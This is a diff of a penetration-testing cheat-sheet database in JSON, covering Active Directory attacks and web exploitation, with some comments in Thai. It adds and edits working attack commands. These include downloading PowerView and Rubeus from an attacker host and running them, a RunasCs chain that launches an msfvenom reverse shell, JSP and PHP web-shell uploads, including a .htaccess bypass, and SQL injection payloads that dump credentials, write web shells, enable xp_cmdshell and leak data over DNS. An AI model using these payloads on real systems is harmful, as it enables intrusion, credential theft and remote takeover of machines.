+      "command": "# Load PowerView in memory.\n(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1') | IEX\n\n# Domain overview and local-admin paths.\nGet-DomainController\nGet-DomainController | Select-Object Name\nFind-LocalAdminAccess\nGet-DomainGroup -Name \"Domain Admins\"\n\n# Users, groups, computers, and interesting attributes.\nGet-DomainUser\nGet-DomainGroup\nGet-DomainComputer | Select-Object dnshostname,operatingsystem\nGet-DomainGroupMember -Identity \"Domain Admins\"\nGet-DomainUser | Where-Object {$_.description} | Select-Object samaccountname,description\n\n# Shares, GPOs, trusts, and roastable users.\nFind-DomainShare -CheckShareAccess\nGet-DomainGPO\nGet-DomainTrust\nGet-DomainUser -SPN\nGet-DomainUser -PreauthNotRequired",
       "lang": "powershell"
-    },
-    {
-      "id": "note-active-directory-enumeration-smb-enum-md-8",
-      "title": "Query a specific user by RID.",
-      "description": "",
-      "source": "Active Directory/Enumeration/SMB Enum.md",
-      "source_type": "markdown",
-      "tab": "Active Directory",
-      "tags": [
-        "Username",
-        "Password",
-        "RPC",
-        "ActiveDirectory",
-        "Enumeration"
-      ],
-      "requires": [
-        "Username",
-        "Password"
-      ],
-      "services": [
-        "RPC",
-        "ActiveDirectory"
-      ],
-      "attack_types": [
-        "Enumeration"
-      ],
-      "target_types": [
-        "ActiveDirectory"
-      ],
-      "outputs": [
-        "Shares",
-        "Users",
-        "Groups",
-        "PasswordPolicy"
-      ],
-      "next": [],
-      "command": "rpcclient -U \"<USER>%<PASS>\" <DC_IP> -c \"queryuser 0x1f4\"",
-      "lang": "sh"
     },
     {
       "id": "note-active-directory-privesc-md-9",
@@ -2344,7 +2450,7 @@
       "lang": ""
     },
     {
-      "id": "note-active-directory-lateral-movement-md-14",
+      "id": "note-active-directory-lateral-movement-md-15",
       "title": "RDP",
       "description": "Check RDP access, and enable RDP through SMB only when you already have admin rights.",
       "source": "Active Directory/Lateral Movement.md",
@@ -2421,7 +2527,7 @@
       "lang": "sh"
     },
     {
-      "id": "note-active-directory-initial-access-md-8",
+      "id": "note-active-directory-initial-access-md-9",
       "title": "Responder Net-NTLMv2 Capture",
       "description": "Capture Net-NTLMv2 with Responder and a coerced UNC path.",
       "source": "Active Directory/Initial Access.md",
@@ -2451,6 +2557,43 @@
       "next": [],
       "command": "# Kali\nsudo responder -I <IFACE> -v\nsudo responder -I <IFACE> -wdF\nsudo responder -I <IFACE> -wdF -P\n\n# Victim shell or injected input\ndir \\\\<LHOST>\\test\n\n# Review captured hashes.\ncat /usr/share/responder/logs/*.txt\n\n# Crack captured NTLMv2.\nhashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt",
       "lang": "sh"
+    },
+    {
+      "id": "note-active-directory-initial-access-md-3",
+      "title": "Rubeus Kerberoast From Victim Shell",
+      "description": "Request Kerberoastable TGS hashes from a domain-joined victim shell, then crack them offline. This is useful when you have code execution on a domain machine but do not yet have reusable domain credentials.",
+      "source": "Active Directory/Initial Access.md",
+      "source_type": "markdown",
+      "tab": "Active Directory",
+      "tags": [
+        "Shell",
+        "Kerberos",
+        "Windows",
+        "ActiveDirectory",
+        "InitialAccess"
+      ],
+      "requires": [
+        "Shell"
+      ],
+      "services": [
+        "Kerberos",
+        "ActiveDirectory"
+      ],
+      "attack_types": [
+        "InitialAccess"
+      ],
+      "target_types": [
+        "Windows",
+        "ActiveDirectory"
+      ],
+      "outputs": [
+        "Hash",
+        "Password",
+        "Username"
+      ],
+      "next": [],
+      "command": "# Target: download Rubeus.\ncertutil -urlcache -split -f http://<LHOST>/Rubeus.exe Rubeus.exe\n\n# Target: request Kerberoast hashes in hashcat format.\n.\\Rubeus.exe kerberoast /format:hashcat /nowrap\n\n# Attacker: save the captured TGS hash.\necho '$krb5tgs$MSSQLSvc/DC.access.offsec:670A' > svc_mssql\n\n# Attacker: crack the TGS hash.\nhashcat -m 13100 svc_mssql <WORDLIST>\n# Example output:\n# ....09a4:trustno1\n# svc_mssql : trustno1",
+      "lang": "powershell"
     },
     {
       "id": "note-active-directory-post-creds-enum-md-4",
@@ -2489,6 +2632,45 @@
       ],
       "next": [],
       "command": "# AS-REP roast and Kerberoast from a domain context.\nRubeus.exe asreproast /format:hashcat /outfile:asrep.txt\nRubeus.exe kerberoast /outfile:kerb.txt /format:hashcat\n\n# Request and inject a TGT with an NTLM hash.\nRubeus.exe asktgt /user:<USER> /rc4:<NTLM_HASH> /ptt\n\n# Inject or inspect tickets.\nRubeus.exe ptt /ticket:<TICKET>.kirbi\nRubeus.exe dump /nowrap\nRubeus.exe monitor /interval:5 /nowrap",
+      "lang": "powershell"
+    },
+    {
+      "id": "note-active-directory-lateral-movement-md-4",
+      "title": "RunasCS Spawn Process As Another User",
+      "description": "Use RunasCS when you have another user's plaintext credentials and want to spawn a command or reverse shell as that user from an existing Windows shell.",
+      "source": "Active Directory/Lateral Movement.md",
+      "source_type": "markdown",
+      "tab": "Active Directory",
+      "tags": [
+        "Username",
+        "Password",
+        "PowerShell",
+        "Windows",
+        "ActiveDirectory",
+        "LateralMovement"
+      ],
+      "requires": [
+        "Username",
+        "Password",
+        "PowerShell"
+      ],
+      "services": [
+        "ActiveDirectory"
+      ],
+      "attack_types": [
+        "LateralMovement"
+      ],
+      "target_types": [
+        "Windows",
+        "ActiveDirectory"
+      ],
+      "outputs": [
+        "Shell",
+        "Hash",
+        "Credentials"
+      ],
+      "next": [],
+      "command": "# Attacker reference:\n# https://raw.githubusercontent.com/antonioCoco/RunasCs/refs/heads/master/Invoke-RunasCs.ps1\n\n# Target: download and load RunasCS.\niwr http://<LHOST>/Invoke-RunasCs.ps1 -outfile Invoke-RunasCs.ps1\n. ./Invoke-RunasCs.ps1\n\n# Target: test command execution as the other user.\nInvoke-RunasCs -Username <USER> -Password '<PASS>' -Command \"whoami\"\n# Example output:\n# access\\svc_mssql\n\n# Attacker: generate a Windows reverse-shell payload.\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe\n\n# Target: download the payload.\niwr http://<LHOST>/shell.exe -o shell.exe\n\n# Attacker: start listener before triggering.\nnc -lvnp <LPORT>\n\n# Target: spawn the payload as the other user.\nInvoke-RunasCs -Username <USER> -Password '<PASS>' -Command \"C:\\users\\public\\shell.exe\"\n\n# Attacker shell: confirm callback identity.\nwhoami\n# Example output:\n# access\\svc_mssql",
       "lang": "powershell"
     },
     {
@@ -2673,7 +2855,7 @@
       "lang": "sh"
     },
     {
-      "id": "note-active-directory-lateral-movement-md-4",
+      "id": "note-active-directory-lateral-movement-md-5",
       "title": "SMB Remote Execution",
       "description": "Use psexec or NetExec for command execution after confirming admin rights.",
       "source": "Active Directory/Lateral Movement.md",
@@ -2712,7 +2894,7 @@
       "lang": "sh"
     },
     {
-      "id": "note-active-directory-initial-access-md-7",
+      "id": "note-active-directory-initial-access-md-8",
       "title": "SMB/RPC User Enum",
       "description": "Try anonymous RPC user enum.",
       "source": "Active Directory/Initial Access.md",
@@ -2744,7 +2926,7 @@
       "lang": "sh"
     },
     {
-      "id": "note-active-directory-lateral-movement-md-13",
+      "id": "note-active-directory-lateral-movement-md-14",
       "title": "Subnet Reuse With NTLM Hash",
       "description": "Sweep a subnet with an NTLM hash and test domain or local auth.",
       "source": "Active Directory/Lateral Movement.md",
@@ -2785,7 +2967,7 @@
       "lang": "sh"
     },
     {
-      "id": "note-active-directory-lateral-movement-md-12",
+      "id": "note-active-directory-lateral-movement-md-13",
       "title": "Subnet Reuse With Password",
       "description": "Sweep a subnet with plaintext credentials and test domain or local auth.",
       "source": "Active Directory/Lateral Movement.md",
@@ -2901,112 +3083,6 @@
       "lang": "sh"
     },
     {
-      "id": "note-active-directory-enumeration-ldap-enum-md-1",
-      "title": "Test anonymous LDAP bind.",
-      "description": "",
-      "source": "Active Directory/Enumeration/LDAP Enum.md",
-      "source_type": "markdown",
-      "tab": "Active Directory",
-      "tags": [
-        "LDAP",
-        "ActiveDirectory",
-        "Enumeration"
-      ],
-      "requires": [],
-      "services": [
-        "LDAP",
-        "ActiveDirectory"
-      ],
-      "attack_types": [
-        "Enumeration"
-      ],
-      "target_types": [
-        "ActiveDirectory"
-      ],
-      "outputs": [
-        "Users",
-        "Groups",
-        "Hash"
-      ],
-      "next": [],
-      "command": "nxc ldap <DC_IP> -u '' -p ''",
-      "lang": "sh"
-    },
-    {
-      "id": "note-active-directory-enumeration-ldap-enum-md-2",
-      "title": "Test authenticated LDAP access.",
-      "description": "",
-      "source": "Active Directory/Enumeration/LDAP Enum.md",
-      "source_type": "markdown",
-      "tab": "Active Directory",
-      "tags": [
-        "Username",
-        "Password",
-        "LDAP",
-        "ActiveDirectory",
-        "Enumeration"
-      ],
-      "requires": [
-        "Username",
-        "Password"
-      ],
-      "services": [
-        "LDAP",
-        "ActiveDirectory"
-      ],
-      "attack_types": [
-        "Enumeration"
-      ],
-      "target_types": [
-        "ActiveDirectory"
-      ],
-      "outputs": [
-        "Users",
-        "Groups",
-        "Hash"
-      ],
-      "next": [],
-      "command": "nxc ldap <DC_IP> -u <USER> -p '<PASS>'",
-      "lang": "sh"
-    },
-    {
-      "id": "note-active-directory-enumeration-smb-enum-md-1",
-      "title": "Test SMB null session.",
-      "description": "Try SMB null session.",
-      "source": "Active Directory/Enumeration/SMB Enum.md",
-      "source_type": "markdown",
-      "tab": "Active Directory",
-      "tags": [
-        "SMB",
-        "ActiveDirectory",
-        "Enumeration"
-      ],
-      "requires": [],
-      "services": [
-        "SMB",
-        "ActiveDirectory"
-      ],
-      "attack_types": [
-        "Enumeration"
-      ],
-      "target_types": [
-        "ActiveDirectory"
-      ],
-      "outputs": [
-        "Shares",
-        "Users",
-        "Groups",
-        "PasswordPolicy",
-        "Domain",
-        "DC",
-        "NamingContext",
-        "Ports"
-      ],
-      "next": [],
-      "command": "nxc smb <DC_IP> -u '' -p ''",
-      "lang": "sh"
-    },
-    {
       "id": "note-active-directory-initial-access-md-1",
       "title": "User Enumeration",
       "description": "Enumerate valid usernames with Kerbrute before roasting or spraying.",
@@ -3109,7 +3185,7 @@
         "Credentials"
       ],
       "next": [],
-      "command": "$username = '<USER>'\n$password = '<PASS>'\n$secureString = ConvertTo-SecureString $password -AsPlainText -Force\n$credential = New-Object System.Management.Automation.PSCredential $username, $secureString\nNew-PSSession -ComputerName <TARGET_HOST> -Credential $credential\nEnter-PSSession 1",
+      "command": "# Build a PSCredential object.\n$username = '<USER>'\n$password = '<PASS>'\n$secureString = ConvertTo-SecureString $password -AsPlainText -Force\n$credential = New-Object System.Management.Automation.PSCredential $username, $secureString\n\n# Create and enter the remote session.\nNew-PSSession -ComputerName <TARGET_HOST> -Credential $credential\nEnter-PSSession 1",
       "lang": "powershell"
     },
     {
@@ -3150,7 +3226,7 @@
       "lang": "cmd"
     },
     {
-      "id": "note-active-directory-lateral-movement-md-6",
+      "id": "note-active-directory-lateral-movement-md-7",
       "title": "WMI Exec With Password",
       "description": "Use Impacket WMI execution with valid domain or local admin credentials.",
       "source": "Active Directory/Lateral Movement.md",
@@ -3674,7 +3750,7 @@
         "Findings"
       ],
       "next": [],
-      "command": "git clone https://github.com/tismayil/ohmybackup.git\ncd ohmybackup\ngo run ohmybackup.go --hostname <TARGET_HOST>\ngo build ohmybackup.go\n./ohmybackup --hostname <TARGET_HOST>",
+      "command": "# Install or update ohmybackup locally.\ngit clone https://github.com/tismayil/ohmybackup.git\ncd ohmybackup\n\n# Run directly or build a local binary.\ngo run ohmybackup.go --hostname <TARGET_HOST>\ngo build ohmybackup.go\n./ohmybackup --hostname <TARGET_HOST>",
       "lang": "sh"
     },
     {
@@ -3881,7 +3957,7 @@
         "Findings"
       ],
       "next": [],
-      "command": "nuclei -update-templates\nnuclei -u http://<TARGET_IP>\nnuclei -u http://<TARGET_IP> -severity critical,high\nnuclei -u http://<TARGET_IP> -t cves/2021/\nnuclei -u http://<TARGET_IP> -t exposures/configs/\nnuclei -l targets.txt -severity high,critical -o nuclei-results.txt",
+      "command": "# Update templates, then run quick and focused scans.\nnuclei -update-templates\nnuclei -u http://<TARGET_IP>\nnuclei -u http://<TARGET_IP> -severity critical,high\n\n# Target specific template groups or a target list.\nnuclei -u http://<TARGET_IP> -t cves/2021/\nnuclei -u http://<TARGET_IP> -t exposures/configs/\nnuclei -l targets.txt -severity high,critical -o nuclei-results.txt",
       "lang": "sh"
     },
     {
@@ -4042,7 +4118,7 @@
         "Findings"
       ],
       "next": [],
-      "command": "nikto -h http://<TARGET_IP>\nnikto -h https://<TARGET_IP> -ssl\nnikto -h http://<TARGET_IP> -p <PORT> -o nikto.txt\nnikto -h http://<TARGET_IP> -Format html -o nikto.html",
+      "command": "# Basic HTTP/HTTPS scans.\nnikto -h http://<TARGET_IP>\nnikto -h https://<TARGET_IP> -ssl\n\n# Scan a specific port and save reports.\nnikto -h http://<TARGET_IP> -p <PORT> -o nikto.txt\nnikto -h http://<TARGET_IP> -Format html -o nikto.html",
       "lang": "sh"
     },
     {
@@ -4107,7 +4183,7 @@
         "Findings"
       ],
       "next": [],
-      "command": "wpscan --url http://<TARGET_IP>\nwpscan --url http://<TARGET_IP> --enumerate u,p,t\nwpscan --url http://<TARGET_IP> --enumerate vp --api-token <TOKEN>",
+      "command": "# Scan the site first.\nwpscan --url http://<TARGET_IP>\n\n# Enumerate users, plugins, themes, and vulnerable plugins.\nwpscan --url http://<TARGET_IP> --enumerate u,p,t\nwpscan --url http://<TARGET_IP> --enumerate vp --api-token <TOKEN>",
       "lang": "sh"
     },
     {
@@ -4136,7 +4212,7 @@
         "Shell"
       ],
       "next": [],
-      "command": "' OR 1=1-- -\n' OR '1'='1\nadmin'--\n' OR ''='",
+      "command": "-- ถ้า login สำเร็จ ให้รีบดู role/session แล้วหา upload/admin/function ที่ไปต่อได้.\n' OR 1=1-- -\n' OR '1'='1\nadmin'--\n' OR ''='",
       "lang": "sql"
     },
     {
@@ -4165,7 +4241,7 @@
         "Shell"
       ],
       "next": [],
-      "command": "-- Baseline.\n' AND 1=1-- -\n' AND 1=2-- -\n\n-- Check table/row.\n' AND (SELECT COUNT(*) FROM users)>0-- -\n' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')=1-- -\n\n-- Check length.\n' AND LENGTH((SELECT password FROM users LIMIT 0,1))>5-- -\n' AND LENGTH((SELECT password FROM users LIMIT 0,1))=32-- -\n\n-- Brute character.\n' AND SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='a'-- -\n' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>77-- -",
+      "command": "-- เริ่มจาก baseline: จำ status/length/content ของ true กับ false ให้ได้ก่อน.\n' AND 1=1-- -\n' AND 1=2-- -\n\n-- ถ้า baseline ต่างกัน ให้ถามทีละคำถามว่า table/row มีอยู่จริงไหม.\n' AND (SELECT COUNT(*) FROM users)>0-- -\n' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')=1-- -\n\n-- รู้ว่ามีข้อมูลแล้วค่อยหา length เพื่อจำกัดขอบเขต brute force.\n' AND LENGTH((SELECT password FROM users LIMIT 0,1))>5-- -\n' AND LENGTH((SELECT password FROM users LIMIT 0,1))=32-- -\n\n-- ค่อยเดาทีละตัวด้วย SUBSTRING/ASCII; ถ้าช้าให้ใช้ sqlmap ช่วย.\n' AND SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='a'-- -\n' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>77-- -",
       "lang": "sql"
     },
     {
@@ -4194,7 +4270,7 @@
         "Shell"
       ],
       "next": [],
-      "command": "-- MySQL.\n' AND IF(1=1,SLEEP(5),0)-- -\n' AND IF(SUBSTRING((SELECT user()),1,1)='r',SLEEP(5),0)-- -\n\n-- MSSQL.\n'; IF (1=1) WAITFOR DELAY '0:0:5'-- -\n'; IF (SUBSTRING(SYSTEM_USER,1,1)='s') WAITFOR DELAY '0:0:5'-- -\n\n-- PostgreSQL.\n' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -",
+      "command": "-- MySQL: ถ้าเงื่อนไขจริง response จะช้าตาม SLEEP.\n' AND IF(1=1,SLEEP(5),0)-- -\n' AND IF(SUBSTRING((SELECT user()),1,1)='r',SLEEP(5),0)-- -\n\n-- MSSQL: ใช้ WAITFOR DELAY เพื่อยืนยัน blind condition.\n'; IF (1=1) WAITFOR DELAY '0:0:5'-- -\n'; IF (SUBSTRING(SYSTEM_USER,1,1)='s') WAITFOR DELAY '0:0:5'-- -\n\n-- PostgreSQL: ใช้ pg_sleep; ถ้าเริ่มช้า ให้ส่งต่อ sqlmap dump.\n' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -",
       "lang": "sql"
     },
     {
@@ -4285,7 +4361,7 @@
         "Shell"
       ],
       "next": [],
-      "command": "-- MySQL / MSSQL.\nSELECT @@version;\n\n-- PostgreSQL.\nSELECT version();\n\n-- Current DB/user.\nSELECT database();\nSELECT current_database();\nSELECT user();\nSELECT current_user;",
+      "command": "-- MySQL/MSSQL มักตอบ @@version; เอาผลไปเลือก section enum ของ engine นั้น.\nSELECT @@version;\n\n-- PostgreSQL ใช้ version(); ถ้าใช่ให้ไป PostgreSQL Enumeration.\nSELECT version();\n\n-- current DB/user ช่วยชี้ว่าจะ enum schema ไหนและ privilege น่าจะถึงแค่ไหน.\nSELECT database();\nSELECT current_database();\nSELECT user();\nSELECT current_user;",
       "lang": "sql"
     },
     {
@@ -4314,7 +4390,7 @@
         "Shell"
       ],
       "next": [],
-      "command": "'\n\"\n`\n)\n');\n' OR 1=1-- -\n' OR 1=2-- -\n' AND SLEEP(5)-- -\n'; WAITFOR DELAY '0:0:5'--\n'; SELECT pg_sleep(5)--",
+      "command": "-- ถ้า quote ทำให้ error/response เปลี่ยน ให้ลองยืนยันด้วย true/false หรือ delay ต่อ.\n'\n\"\n`\n)\n');\n\n-- true/false ควรได้ response ต่างกัน; delay ใช้ได้ดีเมื่อไม่มี output ให้ดู.\n' OR 1=1-- -\n' OR 1=2-- -\n' AND SLEEP(5)-- -\n'; WAITFOR DELAY '0:0:5'--\n'; SELECT pg_sleep(5)--",
       "lang": "sql"
     },
     {
@@ -4345,7 +4421,7 @@
         "Shell"
       ],
       "next": [],
-      "command": "-- Confirm.\n' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -\n\n-- Current DB/user.\n' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -\n' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -\n\n-- Tables / columns.\n' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))-- -\n' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)))-- -\n\n-- Dump credential.\n' AND extractvalue(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM users LIMIT 0,1)))-- -\n\n-- Alternative.\n' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -",
+      "command": "-- ถ้าเห็น version ใน error แปลว่าใช้ error-based dump ต่อได้.\n' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -\n\n-- เอา current DB/user ก่อน จะได้เลือก schema/table ถูก.\n' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -\n' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -\n\n-- ไล่ table แล้วค่อยไล่ column ที่น่าจะมี credential.\n' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))-- -\n' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)))-- -\n\n-- เจอ table/column แล้วค่อย dump ค่าออกมาทีละ row.\n' AND extractvalue(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM users LIMIT 0,1)))-- -\n\n-- ถ้า extractvalue ใช้ไม่ได้ ลอง updatexml.\n' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -",
       "lang": "sql"
     },
     {
@@ -4456,7 +4532,7 @@
         "Shell"
       ],
       "next": [],
-      "command": "curl -X PUT \"https://<TARGET_IP>/uploads/../webapps/ROOT/updates.jsp\" \\\n  -H \"Content-Type: application/x-jsp\" \\\n  --data-raw '<%@ page import=\"java.io.*\" %>\n<html><body>\n<form method=\"GET\"><input type=\"text\" name=\"cmd\"><input type=\"submit\" value=\"Run\"></form>\n<% if(request.getParameter(\"cmd\") != null) {\nProcess p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\nBufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));\nString l; while((l=r.readLine())!=null){ out.println(l+\"<br>\"); } } %>\n</body></html>' -i\n\ncurl \"https://<TARGET_IP>/updates.jsp?cmd=whoami\" -i",
+      "command": "# Upload the JSP shell with HTTP PUT.\ncurl -X PUT \"https://<TARGET_IP>/uploads/../webapps/ROOT/updates.jsp\" \\\n  -H \"Content-Type: application/x-jsp\" \\\n  --data-raw '<%@ page import=\"java.io.*\" %>\n<html><body>\n<form method=\"GET\"><input type=\"text\" name=\"cmd\"><input type=\"submit\" value=\"Run\"></form>\n<% if(request.getParameter(\"cmd\") != null) {\nProcess p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\nBufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));\nString l; while((l=r.readLine())!=null){ out.println(l+\"<br>\"); } } %>\n</body></html>' -i\n\n# Trigger command execution.\ncurl \"https://<TARGET_IP>/updates.jsp?cmd=whoami\" -i",
       "lang": "sh"
     },
     {
@@ -4486,7 +4562,7 @@
         "Shell"
       ],
       "next": [],
-      "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o reverse.exe\nmv reverse.exe reverse.exe.pdf\nnc -lvnp <LPORT>",
+      "command": "# Generate the executable and rename it to an allowed extension.\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o reverse.exe\nmv reverse.exe reverse.exe.pdf\n\n# Catch the callback before triggering the uploaded file.\nnc -lvnp <LPORT>",
       "lang": "sh"
     },
     {
@@ -4528,6 +4604,36 @@
     },
     {
       "id": "note-exploitation-web-payloads-md-14",
+      "title": "File Upload Example 6 - .htaccess PHP Extension Bypass",
+      "description": "Use `.htaccess` to treat a custom extension as PHP when normal PHP extensions are blocked but Apache allows `.htaccess` overrides.",
+      "source": "Exploitation/Web Payloads.md",
+      "source_type": "markdown",
+      "tab": "Exploitation",
+      "tags": [
+        "HTTP",
+        "Linux",
+        "Exploitation"
+      ],
+      "requires": [],
+      "services": [
+        "HTTP"
+      ],
+      "attack_types": [
+        "Exploitation"
+      ],
+      "target_types": [
+        "Linux"
+      ],
+      "outputs": [
+        "Findings",
+        "Shell"
+      ],
+      "next": [],
+      "command": "# Create an .htaccess rule that maps .dork files to PHP.\necho \"AddType application/x-httpd-php .dork\" > .htaccess\n\n# Upload the .htaccess to the target upload directory.\n\n# Create the PHP reverse shell with the allowed custom extension.\nvi revshell.dork\n# Use PHP reverse payload from Ivan Sincek / revshells:\n# https://www.revshells.com/\n\n# Upload revshell.dork to the same target upload directory.\n\n# Attacker: open listener before triggering.\nnc -lvnp <LPORT>\n\n# Trigger the uploaded reverse shell.\ncurl http://<TARGET_IP>/uploads/revshell.dork",
+      "lang": "sh"
+    },
+    {
+      "id": "note-exploitation-web-payloads-md-15",
       "title": "Header Trust Bypass",
       "description": "Use `X-Forwarded-For` when an app trusts localhost or proxy headers.",
       "source": "Exploitation/Web Payloads.md",
@@ -4554,7 +4660,7 @@
       "lang": "sh"
     },
     {
-      "id": "note-exploitation-web-payloads-md-15",
+      "id": "note-exploitation-web-payloads-md-16",
       "title": "Joomla 3.7.0 SQLi User Hash Extraction",
       "description": "Use `joomblah` against Joomla 3.7.0 to extract user hashes, then crack the recovered bcrypt hash offline.",
       "source": "Exploitation/Web Payloads.md",
@@ -4641,7 +4747,7 @@
         "Shell"
       ],
       "next": [],
-      "command": "SELECT IS_SRVROLEMEMBER('sysadmin');\nSELECT name FROM master..sysdatabases;\nSELECT table_name FROM information_schema.tables;\nSELECT name FROM <DB_NAME>..sysobjects WHERE xtype='U';\nSELECT TOP 1 username,password FROM users;\n\nEXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';\nEXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';",
+      "command": "-- เช็ค sysadmin ก่อน; ถ้าไม่ใช่ให้เน้น enum/dump มากกว่า RCE.\nSELECT IS_SRVROLEMEMBER('sysadmin');\nSELECT name FROM master..sysdatabases;\nSELECT table_name FROM information_schema.tables;\nSELECT name FROM <DB_NAME>..sysobjects WHERE xtype='U';\nSELECT TOP 1 username,password FROM users;\n\n-- ถ้าเป็น sysadmin เปิด xp_cmdshell แล้วเช็ค whoami; ได้ command exec แล้วไป shell/privesc.\nEXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';\nEXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';",
       "lang": "sql"
     },
     {
@@ -4702,7 +4808,7 @@
         "Shell"
       ],
       "next": [],
-      "command": "SELECT schema_name FROM information_schema.schemata;\nSELECT table_name FROM information_schema.tables WHERE table_schema=database();\nSELECT table_name FROM information_schema.tables WHERE table_schema='<DB_NAME>';\nSELECT column_name FROM information_schema.columns WHERE table_name='users';\nSELECT concat(username,0x3a,password) FROM users;\nSELECT concat(username,0x3a,password) FROM users LIMIT 0,1;",
+      "command": "-- เริ่มที่ schema list; เลือก DB ที่ไม่ใช่ system DB.\nSELECT schema_name FROM information_schema.schemata;\n\n-- ไล่ table ใน current DB หรือ DB ที่เลือกไว้.\nSELECT table_name FROM information_schema.tables WHERE table_schema=database();\nSELECT table_name FROM information_schema.tables WHERE table_schema='<DB_NAME>';\n\n-- เจอ table น่าสนใจแล้วดู column; credential มักอยู่ใน users/accounts/admins.\nSELECT column_name FROM information_schema.columns WHERE table_name='users';\nSELECT concat(username,0x3a,password) FROM users;\nSELECT concat(username,0x3a,password) FROM users LIMIT 0,1;",
       "lang": "sql"
     },
     {
@@ -4738,7 +4844,7 @@
         "Shell"
       ],
       "next": [],
-      "command": "-- Check privilege / restriction.\nSELECT file_priv FROM mysql.user WHERE user=user();\nSELECT @@secure_file_priv;\n\n-- Read files.\n' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -\n' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL-- -\n' UNION SELECT LOAD_FILE('C:/Windows/System32/drivers/etc/hosts'),NULL-- -\n\n-- Write webshell.\n' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -\n' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE 'C:/xampp/htdocs/shell.php'-- -",
+      "command": "-- ถ้า FILE เป็น Y และ secure_file_priv ไม่ล็อก path โอกาส read/write จะสูงขึ้น.\nSELECT file_priv FROM mysql.user WHERE user=user();\nSELECT @@secure_file_priv;\n\n-- อ่านไฟล์เพื่อหา local user, web config, หรือ credential ของแอป.\n' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -\n' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL-- -\n' UNION SELECT LOAD_FILE('C:/Windows/System32/drivers/etc/hosts'),NULL-- -\n\n-- เขียน webshell เฉพาะเมื่อรู้ web root ที่เขียนได้.\n' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -\n' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE 'C:/xampp/htdocs/shell.php'-- -",
       "lang": "sql"
     },
     {
@@ -4771,7 +4877,7 @@
         "Shell"
       ],
       "next": [],
-      "command": "-- MySQL on Windows.\nSELECT load_file('\\\\\\\\<COLLABORATOR_DOMAIN>\\\\x');\nSELECT load_file(concat('\\\\\\\\',(SELECT hex(database())),'.<COLLABORATOR_DOMAIN>\\\\x'));\n\n-- MSSQL.\nEXEC master..xp_dirtree '\\\\<COLLABORATOR_DOMAIN>\\x';",
+      "command": "-- ถ้า collaborator/DNS มี hit แปลว่า DB ออก network ได้; ใช้ leak ค่าเล็กๆ ต่อ.\nSELECT load_file('\\\\\\\\<COLLABORATOR_DOMAIN>\\\\x');\nSELECT load_file(concat('\\\\\\\\',(SELECT hex(database())),'.<COLLABORATOR_DOMAIN>\\\\x'));\n\n-- MSSQL มักใช้ UNC path ผ่าน xp_dirtree เพื่อ trigger DNS/SMB callback.\nEXEC master..xp_dirtree '\\\\<COLLABORATOR_DOMAIN>\\x';",
       "lang": "sql"
     },
     {
@@ -4802,7 +4908,7 @@
         "Shell"
       ],
       "next": [],
-      "command": "SELECT current_database();\nSELECT current_user;\nSELECT datname FROM pg_database;\nSELECT table_name FROM information_schema.tables WHERE table_schema='public';\nSELECT column_name FROM information_schema.columns WHERE table_name='users';\nSELECT username || ':' || password FROM users LIMIT 1;",
+      "command": "-- ดู current DB/user ก่อน แล้วค่อยเลือก database/table ที่มีข้อมูลแอป.\nSELECT current_database();\nSELECT current_user;\nSELECT datname FROM pg_database;\n\n-- public schema มักเป็นจุดเริ่ม; เจอ users table แล้ว dump credential candidate.\nSELECT table_name FROM information_schema.tables WHERE table_schema='public';\nSELECT column_name FROM information_schema.columns WHERE table_name='users';\nSELECT username || ':' || password FROM users LIMIT 1;",
       "lang": "sql"
     },
     {
